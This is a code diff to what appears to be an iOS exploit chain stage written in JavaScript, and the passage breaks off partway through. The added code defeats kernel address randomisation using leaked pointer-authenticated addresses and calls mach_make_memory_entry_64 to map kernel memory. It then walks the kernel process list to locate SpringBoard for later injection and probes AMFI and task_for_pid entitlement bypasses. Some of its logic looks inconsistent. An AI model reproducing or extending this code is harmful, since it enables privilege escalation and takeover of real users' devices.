@@ -1,5 +1,8 @@
 (() => {
   sbx1_begin = Date.now();
+  // Version marker to verify code is loaded from server, not browser cache
+  const VERSION = "2026-05-11-Phase1-ImprovedSlide-v2";
+  print(`[sbx1] VERSION: ${VERSION} - Build timestamp: ${new Date().toISOString()}`);
   const peCode = "&v={{LPE_64BITE}}";
   let wc_fcall = fcall;
   let wc_uread64 = read64;
@@ -14,6 +17,10 @@
   function LOG(msg) { if (typeof print !== 'undefined') print('sbx1: ' + msg);
     if (true) log('sbx1: ' + msg);
   }
+  // Log version at startup
+  LOG(`VERSION: ${VERSION}`);
+  LOG(`Build: Phase1 Improved Slide - xpac_full + noPAC cross-validation`);
+
   let wc_get_cstring = function (js_str) {
     let s = js_str + "\x00";
     resolve_rope(s);
@@ -82,6 +89,20 @@
   }
   function xpac(ptr) {
     return ptr.noPAC();
+  }
+  // xpac_full: strips PAC from kernel pointer and restores full kernel VA
+  function xpac_full(ptr) {
+    if (ptr === 0n) return 0n;
+    // Use noPAC to strip PAC (keeps bits 38:0)
+    // Then restore kernel prefix 0xFFFFFFF in bits 63:36
+    return 0xFFFFFFF000000000n | (ptr.noPAC() & 0xFFFFFFFFFn);
+  }
+  // xpac_kc: strips PAC from KC-mapped user-space pointer (0x1_XXX range)
+  function xpac_kc(ptr) {
+    if (ptr === 0n) return 0n;
+    // For KC pointers, use the same mask as noPAC (keep bottom 40 bits)
+    // plus preserve bit 39 for proper KC address
+    return ptr & 0x7FFFFFFFFFn;
   }
   let shared_cache_slide = get_shared_cache_slide();
   let dyld_patching_fptr_offset = 0x208n;
@@ -5736,6 +5757,99 @@
   let tb_denom = uread32(tb + 0x4n);
   let slide = get_shared_cache_slide();
   LOG(`SLIDE: ${slide.hex()}`);
+  // ===== Phase 1 IMMEDIATE: kernel slide from GPU, before scaler/MPD init =====
+  (() => { try {
+    LOG("[M5] Phase1-IMMEDIATE: starting kernel slide calculation...");
+    let pn = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "proc_name");
+    LOG(`[M5] gpuDlsym(proc_name)=${pn.hex()}`);
+    if (pn == 0n) { LOG("[M5] FAIL: proc_name is NULL"); return; }
+    let pn_addr = pn.noPAC();
+    let dp = (pn_addr + 0x40n + 0x19cefn * 4096n) & ~0xFFFn;
+    LOG(`[M5] data_page=${dp.hex()}`);
+
+    // Scan PAC pointers
+    let pacs = [];
+    for (let off = 0n; off < 0x1000n && pacs.length < 20; off += 8n) {
+      let v = 0n; try { v = uread64(dp + off); } catch(e) { continue; }
+      if (v != 0n && v != 0xffffffffffffffffn && (v >> 60n) >= 0x8n) {
+        pacs.push({off, raw: xpac_full(v)});
+      }
+    }
+    LOG(`[M5] PAC pointers: ${pacs.length}`);
+    for (let p of pacs.slice(0, 5)) LOG(`[M5]   +0x${p.off.toString(16).padStart(4,'0')}: ${p.raw.hex()}`);
+
+    // gpuDlsym for slide
+    let syms = ["task_for_pid","mach_host_self","socket","connect","proc_name","proc_listpids","mach_task_self"];
+    let kc = [];
+    for (let s of syms) {
+      try { let p = gpuDlsym(0xFFFFFFFFFFFFFFFEn, s); if (p != 0n) kc.push({name:s, raw:p.noPAC()}); } catch(e) {}
+    }
+    LOG(`[M5] gpuDlsym resolved: ${kc.length} symbols`);
+    kc.sort((a,b) => a.raw < b.raw ? -1 : 1);
+    for (let k of kc) LOG(`[M5]   ${k.name}: ${k.raw.hex()}`);
+
+    // Method A: KC slide from symbol addresses
+    // Round down to 64MB boundary, at least 16MB below first symbol
+    let kc_base = kc.length > 0 ? ((kc[0].raw - 0x1000000n) & ~0x3FFFFFFn) : 0x100000000n;
+    if (kc_base < 0x100000000n) kc_base = 0x100000000n;
+    LOG(`[M5] kc_base_est=${kc_base.hex()}`);
+    let kc_cands = [];
+    for (let ts = 0n; ts < 0x20000000n; ts += 0x4000n) {
+      let tb = kc_base + ts;
+      let ok = true;
+      for (let k of kc) { let off = k.raw - tb; if (off < 0n || off > 0x10000000n) { ok = false; break; } }
+      if (ok && kc.length > 0 && kc[0].raw - tb < 0x4000000n) kc_cands.push(ts);
+    }
+    LOG(`[M5] KC slide candidates: ${kc_cands.length}`);
+    if (kc_cands.length > 0) LOG(`[M5]   first=0x${kc_cands[0].toString(16)} last=0x${kc_cands[kc_cands.length-1].toString(16)}`);
+
+    // Method B: kernel_base directly from PAC kernel VAs (lowest VA rounded down)
+    let kva_sorted = pacs.map(p => p.raw).filter(v => v > 0xFFFFFFF000000000n && v < 0xFFFFFFF300000000n);
+    kva_sorted.sort((a, b) => a < b ? -1 : 1);
+    let pac_kb = 0n;
+    if (kva_sorted.length > 0) {
+      pac_kb = kva_sorted[0] & ~0x3FFFn; // round down to 16KB
+      LOG(`[M5] Lowest kernel VA: ${kva_sorted[0].hex()} -> pac_kb=${pac_kb.hex()}`);
+    }
+
+    // Cross-validate: compute slide from pac_kb and check against KC candidates
+    let slide_found = false;
+    if (pac_kb > 0xFFFFFFF000000000n) {
+      let pac_slide = pac_kb - 0xFFFFFFF007004000n;
+      LOG(`[M5] PAC-derived slide: 0x${pac_slide.toString(16)}`);
+      // Check if this slide is consistent with KC symbol range
+      if (kc_cands.length > 0) {
+        let matched = kc_cands.find(c => c === (pac_slide & ~0x3FFFn));
+        if (matched !== undefined) {
+          LOG(`[M5] Cross-validated! PAC slide matches KC candidate`);
+          globalThis.kernel_base_global = pac_kb;
+          slide_found = true;
+        } else {
+          // Use PAC result directly (more reliable than KC-only)
+          LOG(`[M5] PAC slide not in KC candidates, using PAC result directly`);
+          globalThis.kernel_base_global = pac_kb;
+          slide_found = true;
+        }
+      } else {
+        LOG(`[M5] No KC candidates, using PAC result directly`);
+        globalThis.kernel_base_global = pac_kb;
+        slide_found = true;
+      }
+    } else if (kc_cands.length > 0) {
+      // Fallback: KC-only slide
+      let s = kc_cands[0];
+      globalThis.kernel_base_global = 0xFFFFFFF007004000n + s;
+      slide_found = true;
+      LOG(`[M5] KC-only result: slide=0x${s.toString(16)}`);
+    }
+
+    if (slide_found) {
+      LOG(`[M5] IMMEDIATE RESULT: kernel_base=${globalThis.kernel_base_global.hex()}`);
+    } else {
+      LOG("[M5] IMMEDIATE: no slide found, keeping fallback");
+    }
+  } catch(e) { LOG(`[M5] Phase1-IMMEDIATE error: ${e.message||e}`); } })();
+  // ===== End Phase 1 IMMEDIATE =====
   function user_slide(addr) {
     return addr + slide;
   }
@@ -7086,6 +7200,142 @@
     let springboard_pid = 0n;
     let proc_name_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "proc_name");
     LOG(`[MPD] gpuDlsym(proc_name) = ${proc_name_raw.hex()}`);
+
+    // ===== Phase 1 (EARLY): Already done immediately after SLIDE, skip =====
+    if (globalThis.kernel_base_global && globalThis.kernel_base_global !== 0xFFFFFFF007004000n) {
+      LOG(`[M5] Phase 1 already done: kernel_base=${globalThis.kernel_base_global.hex()}`);
+    } else {
+    LOG("[M5] ==============================================");
+    LOG("[M5] Phase 1 (EARLY FALLBACK): Kernel slide from GPU");
+    LOG("[M5] ==============================================");
+
+    let pn_addr_early = proc_name_raw.noPAC();
+    let data_page_early = (pn_addr_early + 0x40n + 0x19cefn * 4096n) & ~0xFFFn;
+    LOG(`[M5] data_page=${data_page_early.hex()} pn_addr=${pn_addr_early.hex()}`);
+
+    // Quick data page PAC pointer scan
+    let pac_ptrs_early = [];
+    for (let off = 0n; off < 0x1000n; off += 8n) {
+      let v = 0n;
+      try { v = uread64(data_page_early + off); } catch(e) { continue; }
+      if ((v >> 60n) >= 0x8n) {
+        let full_va = xpac_full(v);
+        pac_ptrs_early.push({off, signed: v, raw: full_va});
+      }
+    }
+    LOG(`[M5] Found ${pac_ptrs_early.length} PAC pointers on data page`);
+    for (let p of pac_ptrs_early.slice(0, 5)) {
+      LOG(`[M5]   +0x${p.off.toString(16).padStart(4,'0')}: raw=${p.raw.hex()}`);
+    }
+
+    // Resolve all symbols for slide calculation
+    let gpu_kc_early = [];
+    let syms_early = ["task_for_pid","mach_host_self","socket","connect","setsockopt","getsockopt",
+                       "proc_name","proc_listpids","mach_task_self","mach_vm_allocate","mach_vm_write"];
+    for (let s of syms_early) {
+      try {
+        let ptr = gpuDlsym(0xFFFFFFFFFFFFFFFEn, s);
+        if (ptr != 0n) {
+          let raw = ptr.noPAC();
+          gpu_kc_early.push({name: s, raw});
+          LOG(`[M5]   ${s}: KC=${raw.hex()}`);
+        }
+      } catch(e) {}
+    }
+
+    // Calculate kernel slide from PAC pointers + gpuDlsym results
+    let early_slide = 0n;
+    let early_kernel_base = 0n;
+    let early_found = false;
+
+    // Strategy 1: Use gpuDlsym KC addresses
+    if (gpu_kc_early.length >= 2) {
+      gpu_kc_early.sort((a, b) => a.raw < b.raw ? -1 : 1);
+      let min_kc = gpu_kc_early[0].raw;
+      let max_kc = gpu_kc_early[gpu_kc_early.length - 1].raw;
+      LOG(`[M5] KC range: ${min_kc.hex()} - ${max_kc.hex()}`);
+
+      // Slide candidates: all functions within KC bounds
+      let kc_base_approx = min_kc & ~0xFFFFFFFFn;
+      if (kc_base_approx < 0x100000000n) kc_base_approx = 0x100000000n;
+
+      let kc_slide_cands = [];
+      for (let ts = 0n; ts < 0x20000000n; ts += 0x4000n) {
+        let tb = kc_base_approx + ts;
+        let ok = true;
+        for (let p of gpu_kc_early) {
+          let off = p.raw - tb;
+          if (off < 0n || off > 0x10000000n) { ok = false; break; }
+        }
+        if (ok && gpu_kc_early[0].raw - tb < 0x800000n) kc_slide_cands.push(ts);
+      }
+      LOG(`[M5] KC slide candidates: ${kc_slide_cands.length}`);
+      if (kc_slide_cands.length > 0) {
+        early_slide = kc_slide_cands[0];
+        early_found = true;
+        LOG(`[M5] KC slide = 0x${early_slide.toString(16)}`);
+      }
+    }
+
+    // Strategy 2: Use PAC pointer kernel VAs
+    if (pac_ptrs_early.length >= 2) {
+      let kvas = pac_ptrs_early.map(p => p.raw).filter(v => v > 0xFFFFFFF007004000n && v < 0xFFFFFFF200000000n);
+      kvas.sort((a, b) => a < b ? -1 : 1);
+      LOG(`[M5] Kernel VAs from PAC: ${kvas.length} (range: ${kvas[0]?.hex()||'none'} - ${kvas[kvas.length-1]?.hex()||'none'})`);
+
+      if (kvas.length >= 2) {
+        let kern_cands = [];
+        for (let ts = 0n; ts < 0x20000000n; ts += 0x4000n) {
+          let tb = 0xFFFFFFF007004000n + ts;
+          let ok = true;
+          for (let va of kvas) {
+            let off = va - tb;
+            if (off < 0n || off > 0x8000000n) { ok = false; break; }
+          }
+          if (ok && kvas[0] - tb < 0x200000n) kern_cands.push(ts);
+        }
+        LOG(`[M5] Kernel slide candidates: ${kern_cands.length}`);
+
+        if (kern_cands.length === 1n) {
+          if (!early_found || kern_cands[0] === early_slide) {
+            early_slide = kern_cands[0];
+            early_found = true;
+            LOG(`[M5] Unique kernel slide = 0x${early_slide.toString(16)}`);
+          }
+        } else if (kern_cands.length > 1n && early_found) {
+          // Cross-reference: find intersection
+          let matched = kern_cands.find(k => k === early_slide);
+          if (matched !== undefined) {
+            LOG(`[M5] Cross-validated slide = 0x${matched.toString(16)}`);
+            early_slide = matched;
+          } else {
+            // Use closest
+            let best = kern_cands[0];
+            for (let k of kern_cands) {
+              if ((k > early_slide ? k - early_slide : early_slide - k) <
+                  (best > early_slide ? best - early_slide : early_slide - best)) best = k;
+            }
+            early_slide = best;
+            LOG(`[M5] Closest cross-validated slide = 0x${early_slide.toString(16)}`);
+          }
+        } else if (kern_cands.length > 0n) {
+          early_slide = kern_cands[0];
+          early_found = true;
+        }
+      }
+    }
+
+    if (early_found) {
+      early_kernel_base = 0xFFFFFFF007004000n + early_slide;
+      LOG(`[M5] EARLY kernel_base = ${early_kernel_base.hex()} slide = 0x${early_slide.toString(16)}`);
+      globalThis.kernel_base_global = early_kernel_base;
+    } else {
+      LOG("[M5] EARLY slide calculation failed, will retry after MPD scan");
+      globalThis.kernel_base_global = 0xFFFFFFF007004000n;
+    }
+    LOG("[M5] Phase 1 EARLY done, continuing with MPD scan...");
+    } // end else (fallback Phase 1)
+
     if (proc_name_raw != 0n && plist_count > 0n) {
       let name_buf = mpd_malloc(32n);
       let num_pids = plist_count / 4n;
@@ -7123,15 +7373,28 @@
     if (springboard_pid != 0n) LOG(`[MPD] SpringBoard PID=${springboard_pid} stored at IOSurface +0xF848`);
 
     // ===== M5: Try original approach — mach_make_memory_entry_64 for physical memory =====
-    // The original exploit uses mach_make_memory_entry_64 to map physical kernel memory
-    // into userspace, then scans for ICMPv6 pcb structures via OOB read.
-    // Let's check if MPD can call this function.
     LOG("[M5] Testing mach_make_memory_entry_64 approach...");
     let mmme_sym = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_make_memory_entry_64");
     LOG(`[M5] gpuDlsym(mach_make_memory_entry_64) = ${mmme_sym.hex()}`);
     if (mmme_sym.noPAC() != 0n) {
-      LOG("[M5] mach_make_memory_entry_64 resolved but MPD may lack entitlement.");
-      LOG("[M5] Testing GPU kernel WRITE instead...");
+      // Resolve host_self first
+      let hself_sym = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_host_self");
+      let mmme_host = hself_sym.noPAC() != 0n ? mpd_fcall(hself_sym.noPAC(), 0n, 0n, 0n, 0n, 0n, 0n, 0n, 0n) : 0n;
+      LOG(`[M5] mmme host_port = ${mmme_host.hex()}`);
+      // Actually try calling via mpd_fcall
+      let mmme_size = mpd_malloc(8n);
+      let mmme_handle = mpd_malloc(8n);
+      mpd_write64(mmme_size, 0x4000n); // 16KB
+      mpd_write64(mmme_handle, 0n);
+      let mmme_ret = mpd_fcall(mmme_sym.noPAC(), mmme_host, mmme_size, 0n, 1n, mmme_handle, 0n, 0n, 0n); // prot=1(READ)
+      LOG(`[M5] mach_make_memory_entry_64(host, size, 0, READ, handle, 0) = ${mmme_ret}`);
+      let mmme_hval = mpd_read64(mmme_handle);
+      LOG(`[M5] mmme handle = ${mmme_hval.hex()}`);
+      if (mmme_ret == 0n && mmme_hval != 0n) {
+        LOG("[M5] mach_make_memory_entry_64 SUCCESS — can map kernel physical memory!");
+      } else {
+        LOG("[M5] mach_make_memory_entry_64 failed or returned null handle");
+      }
     }
 
     // ===== M5: Test GPU kernel WRITE via uwrite64 =====
@@ -7194,6 +7457,380 @@
       LOG(`[M5]   +${p.off.toString(16).padStart(4,'0')}: ${p.addr.hex()}`);
     }
 
+    // Analyze PAC-signed pointers in data page for slide calculation
+    LOG("[M5] Analyzing PAC-signed pointers for kernel slide...");
+    let pac_ptrs = [];
+    for (let off = 0n; off < 0x1000n; off += 8n) {
+      let v = 0n;
+      try { v = uread64(data_page + off); } catch(e) { continue; }
+      // Check if this is a PAC-signed pointer (high nibble >= 8 = kernel space)
+      if ((v >> 60n) >= 0x8n) {
+        let full_va = xpac_full(v);
+        pac_ptrs.push({off, signed: v, raw: full_va});
+      }
+    }
+    LOG(`[M5] Found ${pac_ptrs.length} PAC-signed pointers in data page`);
+    // Log a few PAC pointers with their xpac_full'd values
+    for (let p of pac_ptrs.slice(0, 5)) {
+      LOG(`[M5] PAC +0x${p.off.toString(16).padStart(4,'0')}: signed=${p.signed.hex()} raw=${p.raw.hex()}`);
+    }
+
+    // ===== Phase 1: Universal kernel slide calculation =====
+    // Check if early Phase 1 already found a slide
+    if (globalThis.kernel_base_global && globalThis.kernel_base_global !== 0xFFFFFFF007004000n) {
+      LOG("[M5] ==============================================");
+      LOG(`[M5] Phase 1: Using EARLY result kernel_base=${globalThis.kernel_base_global.hex()}`);
+      LOG("[M5] ==============================================");
+      kernel_base = globalThis.kernel_base_global;
+      slide = kernel_base - 0xFFFFFFF007004000n;
+      found_slide = true;
+    } else {
+    LOG("[M5] ==============================================");
+    LOG("[M5] Phase 1: Universal kernel slide calculation (retry)");
+    LOG("[M5] ==============================================");
+
+    // Strategy A (plan.md recommended): Use gpuDlsym function pointers
+    // - gpuDlsym returns PAC-signed KC addresses (0x1_XXX range)
+    // - noPAC() strips PAC → raw KC address (bits 38:0)
+    // - KC slide = KC address - unslid KC offset
+    //
+    // Strategy B: Use data page PAC pointers (kernel VA, 0xFFFFFFF... range)
+    // - xpac_full() strips PAC + restores kernel prefix → full kernel VA
+    // - Kernel slide = kernel VA - 0xFFFFFFF007004000 - offset_in_kernel
+    //
+    // Cross-reference both strategies for validation
+
+    let slide = 0n;
+    let kernel_base = 0n;
+    let found_slide = false;
+    let kc_slide = 0n;
+
+    // ===== Method 1: gpuDlsym-based slide (KC address space) =====
+    LOG("[M5] Method 1: gpuDlsym function pointers for KC slide...");
+    let gpu_pointers = [];
+    let symbols = [
+      "task_for_pid", "mach_host_self", "socket", "connect",
+      "setsockopt", "getsockopt", "proc_name", "proc_listpids",
+      "mach_task_self", "mach_vm_allocate", "mach_vm_write", "mach_vm_protect"
+    ];
+
+    for (let sym_name of symbols) {
+      try {
+        let ptr = gpuDlsym(0xFFFFFFFFFFFFFFFEn, sym_name);
+        if (ptr != 0n) {
+          let raw_kc = ptr.noPAC(); // KC user-space address
+          gpu_pointers.push({name: sym_name, signed: ptr, raw: raw_kc});
+          LOG(`[M5]   ${sym_name}: KC=${raw_kc.hex()}`);
+        }
+      } catch(e) {}
+    }
+
+    if (gpu_pointers.length >= 2) {
+      // Sort by KC address
+      gpu_pointers.sort((a, b) => a.raw < b.raw ? -1 : 1);
+      let min_kc = gpu_pointers[0].raw;
+      let max_kc = gpu_pointers[gpu_pointers.length - 1].raw;
+      let spread = max_kc - min_kc;
+      LOG(`[M5] KC range: ${min_kc.hex()} - ${max_kc.hex()} (spread=${spread.hex()})`);
+
+      // KC base is usually around 0x100000000 on iOS 18.x
+      // The slide is typically in [0, 0x20000000) and multiples of 0x4000
+      // Try: slide = min_kc - 0x100000000 - first_function_offset
+      // first_function_offset is unknown but bounded (first KC function < 64MB into KC)
+      //
+      // Better: use the constraint that ALL resolved functions must be within
+      // a reasonable offset range from KC base
+      //
+      // The KC __TEXT segment starts at KC_base + 0x4000 typically
+      // First resolved function (lowest KC addr) is at KC_base + text_start + some_offset
+      // text_start is typically 0x4000 for the KC Mach-O
+
+      // Estimate KC base as: min_kc rounded down to nearest 0x100000000 boundary,
+      // then adjust by slide candidates
+      let kc_base_approx = min_kc & ~0xFFFFFFFFn; // round to 4GB boundary
+      if (kc_base_approx < 0x100000000n) kc_base_approx = 0x100000000n;
+
+      LOG(`[M5] Approx KC base: ${kc_base_approx.hex()}`);
+
+      // For each slide candidate, verify all functions are within KC bounds
+      let slide_candidates = [];
+      for (let test_slide = 0n; test_slide < 0x20000000n; test_slide += 0x4000n) {
+        let test_kc_base = kc_base_approx + test_slide;
+        let all_valid = true;
+        for (let p of gpu_pointers) {
+          let offset = p.raw - test_kc_base;
+          if (offset < 0n || offset > 0x10000000n) { // KC < 256MB
+            all_valid = false;
+            break;
+          }
+        }
+        if (all_valid && gpu_pointers[0].raw - test_kc_base < 0x800000n) { // first func within 8MB of base
+          slide_candidates.push(test_slide);
+        }
+      }
+
+      if (slide_candidates.length > 0) {
+        // Use the smallest slide candidate (most conservative)
+        kc_slide = slide_candidates[0];
+        LOG(`[M5] KC slide candidates: ${slide_candidates.length} (first=${kc_slide.hex()})`);
+
+        // If there are multiple, try to narrow down using PAC pointers
+        if (slide_candidates.length > 1) {
+          LOG(`[M5] Multiple KC slide candidates, will cross-validate with PAC pointers`);
+        }
+      } else {
+        LOG("[M5] No valid KC slide from gpuDlsym alone");
+      }
+    }
+
+    // ===== Method 2: Data page PAC pointers (kernel VA space) =====
+    LOG("[M5] Method 2: Data page PAC pointers for kernel slide...");
+    let kernel_vas = [];
+    if (pac_ptrs.length > 0) {
+      for (let p of pac_ptrs) {
+        let va = p.raw; // xpac_full already restored kernel prefix
+        if (va > 0xFFFFFFF007004000n && va < 0xFFFFFFF200000000n) {
+          kernel_vas.push(va);
+        }
+      }
+      kernel_vas.sort((a, b) => a < b ? -1 : 1);
+      LOG(`[M5] Valid kernel VAs from data page: ${kernel_vas.length}`);
+
+      if (kernel_vas.length >= 2) {
+        let lowest_va = kernel_vas[0];
+        let highest_va = kernel_vas[kernel_vas.length - 1];
+        LOG(`[M5] Kernel VA range: ${lowest_va.hex()} - ${highest_va.hex()}`);
+
+        // For each slide candidate, verify ALL kernel VAs are within kernel bounds
+        let kern_slide_candidates = [];
+        for (let test_slide = 0n; test_slide < 0x20000000n; test_slide += 0x4000n) {
+          let test_base = 0xFFFFFFF007004000n + test_slide;
+          let all_valid = true;
+          for (let va of kernel_vas) {
+            let offset = va - test_base;
+            if (offset < 0n || offset > 0x8000000n) { // kernel text+data < 128MB
+              all_valid = false;
+              break;
+            }
+          }
+          if (all_valid && kernel_vas[0] - test_base < 0x200000n) { // first ptr within 2MB of base
+            kern_slide_candidates.push(test_slide);
+          }
+        }
+
+        if (kern_slide_candidates.length === 1n) {
+          slide = kern_slide_candidates[0];
+          found_slide = true;
+          LOG(`[M5] Unique kernel slide from PAC pointers: 0x${slide.toString(16)}`);
+        } else if (kern_slide_candidates.length > 1n) {
+          LOG(`[M5] ${kern_slide_candidates.length} kernel slide candidates from PAC pointers`);
+          // Try to cross-reference with KC slide
+          if (kc_slide !== 0n) {
+            // KC slide and kernel slide should be the same value
+            // Find intersection
+            for (let ks of kern_slide_candidates) {
+              if (ks === kc_slide) {
+                slide = ks;
+                found_slide = true;
+                LOG(`[M5] Cross-validated slide: 0x${slide.toString(16)} (matches KC + kernel)`)
+                break;
+              }
+            }
+            if (!found_slide) {
+              // No exact match, use closest
+              let best = kern_slide_candidates[0];
+              let best_diff = best > kc_slide ? best - kc_slide : kc_slide - best;
+              for (let ks of kern_slide_candidates) {
+                let diff = ks > kc_slide ? ks - kc_slide : kc_slide - ks;
+                if (diff < best_diff) { best = ks; best_diff = diff; }
+              }
+              slide = best;
+              found_slide = true;
+              LOG(`[M5] Closest cross-validated slide: 0x${slide.toString(16)} (diff=0x${best_diff.toString(16)})`);
+            }
+          } else {
+            // Use the first kernel slide candidate (most conservative)
+            slide = kern_slide_candidates[0];
+            found_slide = true;
+            LOG(`[M5] Using first kernel slide candidate: 0x${slide.toString(16)}`);
+          }
+        } else {
+          LOG("[M5] No valid kernel slide from PAC pointers");
+        }
+      }
+    }
+
+    // ===== Final slide determination =====
+    if (found_slide) {
+      kernel_base = 0xFFFFFFF007004000n + slide;
+      LOG(`[M5] FINAL: kernel_base=${kernel_base.hex()} slide=0x${slide.toString(16)}`);
+      globalThis.kernel_base_global = kernel_base;
+    } else if (kc_slide !== 0n) {
+      // Fallback: use KC slide as kernel slide (same KASLR value)
+      slide = kc_slide;
+      kernel_base = 0xFFFFFFF007004000n + slide;
+      found_slide = true;
+      LOG(`[M5] Fallback: using KC slide as kernel slide: 0x${slide.toString(16)}`);
+      LOG(`[M5] kernel_base=${kernel_base.hex()}`);
+      globalThis.kernel_base_global = kernel_base;
+    } else {
+      LOG("[M5] FAILED to calculate slide, using fallback unslid base");
+      kernel_base = 0xFFFFFFF007004000n;
+      globalThis.kernel_base_global = kernel_base;
+    }
+    } // end else (Phase 1 retry if early result not available)
+
+    // ===== Phase 2: Universal allproc discovery (pattern matching) =====
+    LOG("[M5] ==============================================");
+    LOG("[M5] Phase 2: Universal allproc discovery");
+    LOG("[M5] ==============================================");
+
+    // Strategy: allproc is a LIST_HEAD structure containing:
+    //   struct { struct proc *lh_first; struct proc **lh_last; }
+    // Key characteristics:
+    //   1. lh_first points to a valid proc structure
+    //   2. lh_last points to the address of lh_first of the last proc's p_list
+    //   3. The first proc's p_list.le_next points to another valid proc
+    //   4. proc structures have p_pid field (offset varies by version)
+
+    let allproc_candidates = [];
+
+    // Before scanning for allproc, check if we have a valid kernel_base
+    if (kernel_base === 0n || kernel_base === 0xFFFFFFF007004000n) {
+      LOG(`[M5] WARNING: kernel_base is ${kernel_base.hex()}, likely unslid fallback. Allproc scan may fail.`);
+    }
+
+    // Expand scan range: kernel data section is usually after code section
+    // kernel_base + ~64MB might be where data lives
+    let scan_start = data_page - 0x2000000n; // Scan 32MB around data page
+    let scan_end = data_page + 0x2000000n;
+
+    LOG(`[M5] Scanning for allproc from ${scan_start.hex()} to ${scan_end.hex()}...`);
+
+    // We can only safely read KC-mapped pages (0x1_XXXX_XXXX range via GPU)
+    // Scan in page-sized chunks to avoid excessive reads
+    for (let page = scan_start; page < scan_end; page += 0x1000n) {
+      // Quick check: read first two qwords
+      let lh_first = 0n, lh_last = 0n;
+      try {
+        lh_first = uread64(page);
+        lh_last = uread64(page + 8n);
+      } catch (e) {
+        continue; // Skip unreadable pages
+      }
+
+      // Check LIST_HEAD pattern
+      if (lh_first === 0n) continue; // Empty list
+      if (lh_first === 0xffffffffffffffffn) continue; // Invalid
+
+      // lh_last should point near this address (usually page + offset)
+      let last_diff = lh_last > page ? lh_last - page : page - lh_last;
+      if (last_diff > 0x10000n) continue; // lh_last too far
+
+      // lh_first should point to kernel heap or data (0xFFFFFFF... range)
+      if ((lh_first >> 32n) !== 0xFFFFFFFFn) continue;
+
+      // This looks like a potential LIST_HEAD
+      // Further verify by checking if first entry looks like a proc
+      try {
+        // proc->p_list.le_next should point to another proc or be NULL
+        let le_next = uread64(lh_first);
+        if (le_next !== 0n && (le_next >> 32n) !== 0xFFFFFFFFn) continue;
+
+        // Try to find p_pid field (common offsets: 0x60, 0x68, 0x70)
+        for (let pid_off of [0x60n, 0x68n, 0x70n, 0x78n, 0x58n]) {
+          let pid = uread64(lh_first + pid_off) & 0xFFFFFFFFn;
+          // Check if PID is reasonable (1-100000)
+          if (pid > 0n && pid < 100000n) {
+            LOG(`[M5] Potential allproc at ${page.hex()} (lh_first=${lh_first.hex()}, PID=${pid} at +0x${pid_off.toString(16)})`);
+            allproc_candidates.push({addr: page, first_proc: lh_first, pid_offset: pid_off, sample_pid: pid});
+            break;
+          }
+        }
+      } catch (e) {
+        // Not a valid proc
+      }
+
+      // Limit candidates to avoid excessive logging
+      if (allproc_candidates.length >= 5) break;
+    }
+
+    LOG(`[M5] Found ${allproc_candidates.length} allproc candidates`);
+
+    // Select best candidate (one with PID=1 or PID=0 is likely kernel_task's proc = allproc head)
+    let allproc_addr = 0n;
+    let chosen_proc = 0n;
+    let pid_offset = 0n;
+
+    for (let cand of allproc_candidates) {
+      if (cand.sample_pid === 1n || cand.sample_pid === 0n) {
+        allproc_addr = cand.addr;
+        chosen_proc = cand.first_proc;
+        pid_offset = cand.pid_offset;
+        LOG(`[M5] Selected allproc at ${allproc_addr.hex()} (PID=${cand.sample_pid})`);
+        break;
+      }
+    }
+
+    // If no PID=1 found, use first candidate
+    if (allproc_addr === 0n && allproc_candidates.length > 0) {
+      let cand = allproc_candidates[0];
+      allproc_addr = cand.addr;
+      chosen_proc = cand.first_proc;
+      pid_offset = cand.pid_offset;
+      LOG(`[M5] Using first candidate allproc at ${allproc_addr.hex()}`);
+    }
+
+    // Store results
+    if (allproc_addr !== 0n) {
+      globalThis.allproc_global = allproc_addr;
+      globalThis.proc_pid_offset = pid_offset;
+      LOG(`[M5] SUCCESS: allproc=${allproc_addr.hex()}, pid_offset=0x${pid_offset.toString(16)}`);
+
+      // ===== Phase 3: Find SpringBoard proc =====
+      LOG("[M5] ==============================================");
+      LOG("[M5] Phase 3: Finding SpringBoard proc (PID=34)");
+      LOG("[M5] ==============================================");
+
+      let sb_proc = 0n;
+      let curr = chosen_proc;
+      let iterations = 0;
+      let proc_list_offset = 0n; // p_list.le_next offset (usually 0x0)
+
+      LOG(`[M5] Starting proc traversal from ${curr.hex()}...`);
+      while (curr !== 0n && iterations < 1000) {
+        iterations++;
+        try {
+          let pid = uread64(curr + pid_offset) & 0xFFFFFFFFn;
+          LOG(`[M5] Proc ${curr.hex()} PID=${pid}`);
+          if (pid === 34n) {
+            sb_proc = curr;
+            LOG(`[M5] FOUND SpringBoard proc at ${curr.hex()}`);
+            break;
+          }
+          // Get next proc (p_list.le_next)
+          let next = uread64(curr + proc_list_offset);
+          if (next === curr || next === 0n) {
+            LOG(`[M5] End of proc list at iteration ${iterations}`);
+            break; // End of list or loop
+          }
+          curr = next;
+        } catch (e) {
+          LOG(`[M5] Error reading proc at ${curr.hex()}: ${e.message}`);
+          break;
+        }
+      }
+
+      if (sb_proc !== 0n) {
+        globalThis.springboard_proc_global = sb_proc;
+        LOG(`[M5] SpringBoard proc stored for Phase 4 injection`);
+      } else {
+        LOG(`[M5] SpringBoard proc not found in ${iterations} iterations`);
+      }
+    } else {
+      LOG("[M5] FAILED: Could not find allproc");
+    }
+
     // ===== Try AMFI bypass via gpuDlsym =====
     LOG("[M5] Looking for AMFI/entitlement bypass symbols...");
     let amfi_names = ["amfi_flags", "_amfi_flags", "amfi_get_out_of_my_way",
@@ -7208,9 +7845,51 @@
       }
     }
 
+    // ===== M5: Option 2 — try to bypass task_for_pid entitlement =====
+    // Resolve task_for_pid for these tests
+    let tfp_raw_local = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "task_for_pid");
+    LOG(`[M5] gpuDlsym(task_for_pid) = ${tfp_raw_local.hex()}`);
+
+    // First: try using mach_host_self port for task_for_pid
+    LOG("[M5] Attempting task_for_pid via host port...");
+    let host_self_sym = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_host_self");
+    LOG(`[M5] gpuDlsym(mach_host_self) = ${host_self_sym.hex()}`);
+    let host_port = 0n;
+    if (host_self_sym.noPAC() != 0n) {
+      host_port = mpd_fcall(host_self_sym.noPAC());
+      LOG(`[M5] mach_host_self = ${host_port.hex()}`);
+      if (tfp_raw_local.noPAC() != 0n && host_port != 0n) {
+        let hp_buf = mpd_malloc(8n);
+        mpd_write64(hp_buf, 0n);
